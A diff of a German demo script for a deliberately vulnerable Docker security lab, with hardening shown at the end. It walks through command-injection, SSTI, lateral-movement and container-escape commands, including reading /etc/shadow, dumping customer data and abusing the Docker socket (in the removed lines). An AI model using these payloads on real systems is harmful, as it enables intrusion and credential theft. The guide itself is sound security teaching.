@@ -1,81 +1,277 @@
-# Docker Container Security — Angriffs- und Härtungsanleitung
-
-## Überblick
-
-Diese Anleitung beschreibt Schritt für Schritt, wie die eingebauten Schwachstellen in der
-verwundbaren Docker-Umgebung ausgenutzt und anschließend durch die gehärtete Version verhindert
-werden.
+# Demo-Drehbuch: Docker Container Security
 
 ---
 
-## Vorbereitung
+## Übersicht
 
-### Projekt starten
+| Schritt | Angriff | Zeit | Typ |
+|---|---|---|---|
+| 0 | Setup & Vorbereitung | ~2 Min | — |
+| 1 | Command Injection | ~2 Min | **PFLICHT** |
+| 2 | Lateral Movement | ~2 Min | **PFLICHT** |
+| 3 | Container Escape | ~2 Min | **PFLICHT** |
+| 4 | SSTI | ~2 Min | optional |
+| 5 | Secrets in Env-Vars | ~1 Min | optional |
+| — | Härtung zeigen | ~2 Min | **PFLICHT** |
+
+**Pflicht-Demo:** ca. 8 Minuten  
+**Mit beiden Optionals:** ca. 11 Minuten
+
+---
+
+## Schritt 0 — Setup (vor dem Start, nicht live)
+
+### Im Terminal ausführen
 
 ```bash
+cd docker-container-security
 docker compose up -d --build
 ```
 
-Ca. 30–60 Sekunden warten (MySQL-Initialisierung), dann im Browser öffnen:
+### Warten bis MySQL bereit ist
+
+```bash
+docker compose logs db --follow
+```
+
+Warten bis diese Zeile erscheint, dann `Ctrl+C`:
+
+```
+db  | /usr/sbin/mysqld: ready for connections
+```
+
+Alternativ einfach 60 Sekunden warten.
+
+### Prüfen ob alles läuft
+
+```bash
+docker compose ps
+```
+
+Erwartete Ausgabe — alle drei Container müssen `running` zeigen:
+
+```
+NAME      STATUS
+webapp    running
+db        running
+admin     running
+```
+
+### Browser-Tab öffnen
 
 ```
 http://localhost:5001
 ```
 
+Die Seite muss laden und ein Formular mit einem Ping-Feld zeigen.  
+Blaues Design = verwundbare Version. ✓
+
+### Terminal für die Demo bereithalten
+
+Ein Terminal-Fenster offen lassen — wird für Schritt 3 und optional Schritt 5 gebraucht.
+
 ---
 
-## Schritt 1 — Command Injection
+## PFLICHT — Angriff 1: Command Injection
 
-### Ziel
+**Was wird gezeigt:** Nutzereingabe wird ungefiltert als Shell-Befehl ausgeführt.
 
-Zeigen, dass unsanitisierte Nutzereingaben direkt als Shell-Befehl ausgeführt werden.
+### 1.1 — Normaler Ping (zeigen dass das Tool "legitim" ist)
 
-### Normaler Test
-
-Im Ping-Formular eingeben:
+Im Browser im Ping-Feld eingeben:
 
 ```
 8.8.8.8
 ```
 
-Erwartetes Ergebnis: normales Ping-Ausgabe.
+Auf **„Ping ausführen"** klicken.
 
-### Angriff
+Erwartete Ausgabe:
+```
+PING 8.8.8.8 (8.8.8.8): 56 data bytes
+64 bytes from 8.8.8.8: ...
+```
 
-Eingabe:
+> 💬 *„Das ist ein normales Diagnose-Tool im Kundenportal — sieht harmlos aus."*
+
+---
+
+### 1.2 — Command Injection: Wer bin ich?
+
+Im Ping-Feld eingeben:
 
 ```
 8.8.8.8; whoami
 ```
 
-Erwartetes Ergebnis:
-
+Erwartete Ausgabe (ganz unten im Ergebnis):
 ```
 root
 ```
 
-Der Angreifer führt beliebige Befehle als Root-Benutzer aus.
-
-### Erkundung des Systems
-
-```
-8.8.8.8; id
-8.8.8.8; cat /etc/os-release
-8.8.8.8; cat /proc/1/cgroup
-```
-
-`/proc/1/cgroup` zeigt Einträge mit `docker` — bestätigt, dass wir uns im Container befinden.
+> 💬 *„Das Semikolon beendet den Ping-Befehl und startet einen neuen. Die App übergibt die Eingabe ungefiltert an die Shell — wir führen jetzt beliebige Befehle als Root aus."*
 
 ---
 
-## Schritt 2 — Server-Side Template Injection (SSTI)
+### 1.3 — Sind wir im Container?
 
-### Ziel
+Im Ping-Feld eingeben:
 
-Zeigen, dass Nutzereingaben, die direkt in ein serverseitiges Template eingebettet werden,
-zur Ausführung von Code auf dem Server führen können.
+```
+8.8.8.8; cat /proc/1/cgroup
+```
 
-### Angriff
+Erwartete Ausgabe enthält:
+```
+docker
+```
+
+> 💬 *„Wir sehen, dass wir in einem Docker-Container sind. Jetzt schauen wir was wir von hier aus noch erreichen können."*
+
+---
+
+## PFLICHT — Angriff 2: Lateral Movement
+
+**Was wird gezeigt:** Ein kompromittierter Container kann andere interne Dienste direkt ansprechen, weil keine Netzwerksegmentierung existiert.
+
+### 2.1 — Internen Admin-Service angreifen
+
+Im Ping-Feld eingeben:
+
+```
+; curl -s http://admin:8080/api/config
+```
+
+Erwartete Ausgabe:
+```json
+{
+  "admin_users": [...],
+  "internal_api_keys": {
+    "aws_access_key": "AKIAIOSFODNN7EXAMPLE",
+    "aws_secret_key": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
+    "database_master_password": "SuperSecret123!"
+  }
+}
+```
+
+> 💬 *„Der Admin-Service ist nur im internen Netz — kein Browser weltweit kann ihn direkt aufrufen. Aber weil die Webapp im selben Netz hängt, können wir ihn über Docker-DNS ansprechen und alle API-Keys stehlen."*
+
+---
+
+### 2.2 — Datenbank direkt abfragen
+
+Im Ping-Feld eingeben:
+
+```
+; mysql -h db -u root -proot -e "SELECT * FROM kundenportal.kunden"
+```
+
+Erwartete Ausgabe:
+```
+id  vorname  nachname  email                        kreditkarte           kontostand
+1   Anna     Müller    anna.mueller@example.com     4111-XXXX-XXXX-1234   15420.50
+2   Thomas   Schmidt   thomas.schmidt@example.com   5500-XXXX-XXXX-5678   8930.00
+...
+```
+
+> 💬 *„Das Datenbankpasswort ist 'root' — und die Webapp hat direkten Netzwerkzugriff auf die DB. Kundendaten, Kreditkarteninformationen — alles in einer Anfrage."*
+
+---
+
+## PFLICHT — Angriff 3: Container Escape
+
+**Was wird gezeigt:** Ein Container mit `privileged: true` kann das Host-Dateisystem einhängen und hat damit vollen Zugriff auf den Host.
+
+> ⚠️ **Hinweis für Docker Desktop (macOS/Windows):** Das Einhängen funktioniert, zeigt aber das Dateisystem der internen Linux-VM, nicht den Mac/Windows-Rechner. Das Prinzip ist identisch — kurz erklären, nicht als Fehler behandeln.
+
+---
+
+### 3.1 — Privilegierten Modus erkennen
+
+Im Ping-Feld eingeben:
+
+```
+; fdisk -l 2>/dev/null | head -10
+```
+
+Erwartete Ausgabe (Festplatten sind sichtbar):
+```
+Disk /dev/sda: 59.6 GiB, ...
+Disk /dev/sdb: ...
+```
+
+> 💬 *„Ein normaler Container sieht keine Festplatten des Hosts. Weil dieser Container mit privileged: true läuft, sehen wir hier die echten Block-Devices des Hosts."*
+
+---
+
+### 3.2 — Richtigen Device-Namen finden
+
+Im Ping-Feld eingeben:
+
+```
+; lsblk
+```
+
+Erwartete Ausgabe — den Namen der **ersten Partition** notieren (z.B. `sda1`, `vda1`):
+
+```
+NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
+sda      8:0    0 59.6G  0 disk
+└─sda1   8:1    0 59.6G  0 part /
+```
+
+---
+
+### 3.3 — Host-Dateisystem einhängen
+
+Im Ping-Feld eingeben — `sda1` durch den Device-Namen aus 3.2 ersetzen:
+
+```
+; mkdir -p /mnt/host && mount /dev/sda1 /mnt/host 2>/dev/null; ls /mnt/host/
+```
+
+Erwartete Ausgabe (Root-Verzeichnis des Hosts):
+```
+bin  boot  dev  etc  home  lib  lost+found  media  mnt  opt  proc  root  run  srv  sys  tmp  usr  var
+```
+
+---
+
+### 3.4 — Host-Dateien lesen
+
+Im Ping-Feld eingeben:
+
+```
+; cat /mnt/host/etc/hostname
+```
+
+```
+; cat /mnt/host/etc/shadow | head -3
+```
+
+> 💬 *„Wir lesen jetzt Dateien vom Host-System — direkt aus dem Container heraus. Shadow-Datei mit Passwort-Hashes, Konfigurationen, SSH-Keys — alles erreichbar. Der Container ist ausgebrochen."*
+
+---
+
+---
+
+## OPTIONAL — Angriff 4: Server-Side Template Injection (SSTI)
+
+**Was wird gezeigt:** Nutzereingabe wird direkt als Jinja2-Template gerendert — Template-Ausdrücke werden serverseitig ausgewertet.
+
+### 4.1 — Normaler Berichts-Aufruf
+
+Im Browser aufrufen:
+
+```
+http://localhost:5001/report?title=Wochenbericht
+```
+
+Erwartete Ausgabe: Eine Seite mit der Überschrift „Wochenbericht".
+
+---
+
+### 4.2 — Template-Expression einschleusen
 
 Im Browser aufrufen:
 
@@ -83,247 +279,131 @@ Im Browser aufrufen:
 http://localhost:5001/report?title={{7*7}}
 ```
 
-Erwartetes Ergebnis: Die Seite zeigt `49` statt des eingegebenen Textes.
-Jinja2 hat den Template-Ausdruck serverseitig ausgewertet.
+Erwartete Ausgabe: Die Überschrift zeigt **`49`** — nicht den eingegebenen Text.
 
-### Weiterführend
+> 💬 *„Jinja2 hat den Ausdruck serverseitig ausgewertet. Das bedeutet: wir kontrollieren den Template-Engine des Servers."*
+
+---
+
+### 4.3 — Flask-Konfiguration auslesen
+
+Im Browser aufrufen:
 
 ```
 http://localhost:5001/report?title={{config}}
 ```
 
-Zeigt die vollständige Flask-Konfiguration einschließlich des `SECRET_KEY`.
+Erwartete Ausgabe: Die gesamte Flask-Konfiguration wird angezeigt, inklusive `SECRET_KEY`.
 
-```
-http://localhost:5001/report?title={{''.__class__.__mro__[1].__subclasses__()}}
-```
-
-Listet alle Python-Subklassen auf — Ausgangspunkt für vollständige Remote Code Execution.
+> 💬 *„Mit dem Secret-Key können alle Session-Cookies der Anwendung gefälscht werden — jeder Nutzer kann imitiert werden. SSTI kann bis zu vollständiger Remote Code Execution eskalieren."*
 
 ---
 
-## Schritt 3 — Lateral Movement
+## OPTIONAL — Angriff 5: Secrets in Umgebungsvariablen
 
-### Ziel
+**Was wird gezeigt:** Passwörter und API-Keys in Env-Vars sind für jeden Prozess im Container lesbar.
 
-Zeigen, wie ein kompromittierter Container andere Dienste im internen Netz angreift.
-
-### Netzwerk erkunden
-
-```
-8.8.8.8; cat /etc/hosts
-```
-
-Zeigt die eigene IP-Adresse des Containers.
-
-### Andere Container finden
-
-```
-;for i in $(seq 1 15); do ping -c 1 -W 1 172.18.0.$i 2>/dev/null | grep "bytes from" && echo "HOST: 172.18.0.$i"; done
-```
-
-Hinweis: IP-Adressen können variieren.
-
-### Admin-Service angreifen
-
-```
-; curl -s http://admin:8080/api/config
-```
-
-Erwartetes Ergebnis: AWS-Keys, Admin-Zugangsdaten, Datenbankkonfiguration.
-
-Docker-DNS erlaubt die Auflösung des Service-Namens `admin` direkt.
-
-### Datenbank angreifen
-
-```
-; mysql -h db -u root -proot -e "SELECT * FROM kundenportal.kunden"
-```
-
-Erwartetes Ergebnis: Alle Kundendatensätze einschließlich Kreditkarteninformationen.
-
----
-
-## Schritt 4 — Container Escape (Privileged Mode)
-
-### Ziel
-
-Zeigen, wie ein privilegierter Container auf das Host-Dateisystem zugreifen kann.
-
-### Privilegierten Modus erkennen
-
-```
-; fdisk -l 2>/dev/null | head -10
-```
-
-Wenn Festplatten angezeigt werden: Container ist privilegiert.
-
-### Block-Devices anzeigen
-
-```
-; lsblk
-```
-
-Device-Namen können variieren: `sda1`, `vda1`, `xvda1`.
-
-### Host-Dateisystem einhängen
-
-```
-; mkdir -p /mnt/host && mount /dev/sda1 /mnt/host 2>/dev/null; ls /mnt/host/
-```
-
-### Host-Dateien lesen
-
-```
-; cat /mnt/host/etc/hostname
-; cat /mnt/host/etc/shadow | head -5
-```
-
-Vollständiger Lesezugriff auf das Host-Dateisystem.
-
----
-
-## Schritt 5 — Secrets in Umgebungsvariablen
-
-### Ziel
-
-Zeigen, dass Passwörter und API-Keys in Umgebungsvariablen für jeden Prozess im Container
-lesbar sind.
-
-### Angriff aus dem Container
+### Im Ping-Feld eingeben:
 
 ```
 ; cat /proc/1/environ | tr '\0' '\n'
 ```
 
-Erwartetes Ergebnis:
-
+Erwartete Ausgabe enthält:
 ```
 DB_PASSWORD=root
 SECRET_API_KEY=sk-prod-a8f3b2c1d4e5f6a7b8c9d0e1f2a3b4c5
 JWT_SECRET=my-super-secret-jwt-signing-key-2024
 ```
 
-### Angriff von außen (Docker-Host)
-
-```bash
-docker inspect $(docker compose ps -q webapp) | python3 -m json.tool | grep -A 10 '"Env"'
-```
+> 💬 *„Alle Umgebungsvariablen des Prozesses liegen in /proc im Klartext. Das ist die häufigste Art wie Secrets in Docker-Umgebungen übergeben werden — und einer der häufigsten Fehler in der Praxis."*
 
 ---
 
-## Schritt 6 — Secrets in Image-Layern
-
-### Ziel
-
-Zeigen, dass Zugangsdaten, die in `RUN`-Befehlen im Dockerfile vorkommen, dauerhaft in
-der Image-History gespeichert bleiben.
-
-### Image-History analysieren
-
-```bash
-docker history --no-trunc docker-container-security-webapp
-```
-
-Erwartetes Ergebnis: Ein `RUN`-Befehl mit dem Datenbankzugang im Klartext:
-
-```
-RUN echo "BACKUP_DB_URL=mysql://backup_user:Backup@2024!@db-prod.firma.local/kundenportal" ...
-```
-
-### Aus dem Container
-
-```
-; cat /etc/environment
-```
-
 ---
 
-## Schritt 7 — Docker Socket Exposure
+## PFLICHT — Härtung zeigen
 
-### Ziel
+**Was wird gezeigt:** Dieselben Angriffe schlagen in der gehärteten Version fehl.
 
-Zeigen, dass ein in den Container eingebundener Docker-Socket vollständige Kontrolle über
-den Docker-Daemon und damit über den Host ermöglicht.
-
-### Socket prüfen
-
-```
-; ls -la /var/run/docker.sock
-```
-
-### Laufende Container auflisten
-
-```
-; curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | python3 -m json.tool | head -40
-```
-
-### Privilegierten Container über die API erstellen
-
-```
-; curl -s --unix-socket /var/run/docker.sock \
-    -X POST \
-    -H "Content-Type: application/json" \
-    -d '{"Image":"alpine","Cmd":["/bin/sh","-c","cat /host/etc/shadow | head -5"],"Binds":["/:/host"],"Privileged":true}' \
-    "http://localhost/containers/create?name=escape2"
-```
-
-Container starten:
-
-```
-; curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/escape2/start
-```
-
-Ausgabe lesen:
-
-```
-; sleep 2 && curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/escape2/logs?stdout=1"
-```
-
-Ergebnis: `/etc/shadow` des Hosts wird ausgegeben — vollständige Host-Übernahme ohne `--privileged`.
-
----
-
-## Härtung demonstrieren
-
-### Verwundbare Version stoppen
+### Im Terminal: Umschalten auf die gehärtete Version
 
 ```bash
 docker compose down
-```
-
-### Gehärtete Version starten
-
-```bash
 docker compose -f docker-compose.hardened.yml up -d --build
 ```
 
-Dann im Browser öffnen: `http://localhost:5001` (grünes Design = gehärtet)
+Warten bis alles läuft (ca. 15 Sekunden):
 
-### Command Injection erneut versuchen
+```bash
+docker compose -f docker-compose.hardened.yml ps
+```
 
-Eingabe:
+Browser neu laden:
+
+```
+http://localhost:5001
+```
+
+Grünes Design mit Badge „GEHÄRTET" = korrekt. ✓
+
+---
+
+### H.1 — Command Injection schlägt fehl
+
+Im Ping-Feld eingeben:
 
 ```
 8.8.8.8; whoami
 ```
 
-Erwartetes Ergebnis: `Ungültige Eingabe!` — die Input-Validierung blockiert den Angriff.
+Erwartete Ausgabe:
+```
+Ungültige Eingabe! Nur IP-Adressen und Hostnamen erlaubt.
+```
 
-### Container betreten und Rechte prüfen
+> 💬 *„Input-Validierung mit Regex-Whitelist blockiert alles außer gültigen IPs und Hostnamen."*
+
+---
+
+### H.2 — Rechte im Container prüfen
+
+Im Terminal:
 
 ```bash
 docker compose -f docker-compose.hardened.yml exec webapp sh
 ```
 
+Dann im Container:
+
 ```bash
-whoami        # → appuser (nicht root)
-fdisk -l      # → Permission denied
-mount         # → Permission denied
-curl admin:8080  # → Network unreachable (Segmentierung)
+whoami
+```
+```
+appuser
 ```
 
-### Aufräumen
+```bash
+fdisk -l
+```
+```
+fdisk: cannot open /dev/sda: Permission denied
+```
+
+```bash
+curl http://admin:8080
+```
+```
+curl: (6) Could not resolve host: admin
+```
+
+Mit `exit` verlassen.
+
+> 💬 *„Non-Root-User, keine Capabilities, keine Netzwerkverbindung zum Backend — selbst wenn ein Angreifer reinkäme, wäre der Schaden minimal."*
+
+---
+
+### Im Terminal aufräumen
 
 ```bash
 docker compose -f docker-compose.hardened.yml down
@@ -331,32 +411,14 @@ docker compose -f docker-compose.hardened.yml down
 
 ---
 
-## Zusammenfassung der Schwachstellen und Gegenmaßnahmen
+## Troubleshooting
 
-| Schwachstelle | Ursache | Gegenmaßnahme |
-|---|---|---|
-| Command Injection | `shell=True`, keine Validierung | Regex-Whitelist, Argumente als Liste |
-| SSTI | Nutzereingabe als Template | Festes Template, Werte als Variablen |
-| Lateral Movement | Webapp in beiden Netzen | Netzwerksegmentierung, `internal: true` |
-| Container Escape | `privileged: true` | Flag weglassen, `cap_drop: ALL` |
-| Env-Var Secrets | Secrets als Umgebungsvariablen | Docker Secrets / externe Vaults |
-| Image-Layer Secrets | Credentials in `RUN`-Befehlen | Build-Argumente, mehrstufige Builds |
-| Docker Socket | Socket als Volume eingebunden | Socket nie exponieren |
-| Schwaches Passwort | `MYSQL_ROOT_PASSWORD: root` | Starkes Zufallspasswort |
-| Root im Container | Kein `USER`-Direktive | Non-Root-User im Dockerfile |
-
----
-
-## Kernaussage
-
-Container sind keine vollständige Sicherheitsgrenze.
-
-Ohne gezielte Härtung können:
-- beliebige Befehle eingeschleust werden (Command Injection, SSTI)
-- andere Container und Dienste kompromittiert werden (Lateral Movement)
-- das Host-System übernommen werden (Privileged Escape, Docker Socket)
-- Zugangsdaten aus dem laufenden System oder aus Image-Layern extrahiert werden
-
-Sicherheit in Container-Umgebungen entsteht durch das Zusammenspiel mehrerer Maßnahmen:
-Least-Privilege, Netzwerksegmentierung, sichere Konfiguration, Input-Validierung und
-sorgfältiges Secrets-Management.
+| Problem | Lösung |
+|---|---|
+| Browser zeigt nichts | `docker compose ps` prüfen — alle Container `running`? |
+| MySQL antwortet nicht | Nochmal 30 Sek warten, dann `; mysql ...` erneut |
+| `fdisk -l` zeigt nichts | Unter Docker Desktop normal — `lsblk` versuchen |
+| Device-Name unbekannt | `; lsblk` ausführen und den richtigen Namen ablesen |
+| SSTI zeigt `{{7*7}}` als Text | URL direkt in Adressleiste eingeben, nicht über Formular |
+| Port 5001 nicht erreichbar | `docker compose ps` — läuft webapp? Sonst `docker compose logs webapp` |
+| Gehärtete Version startet nicht | `docker compose down` sicherstellen, dann erneut `up` |
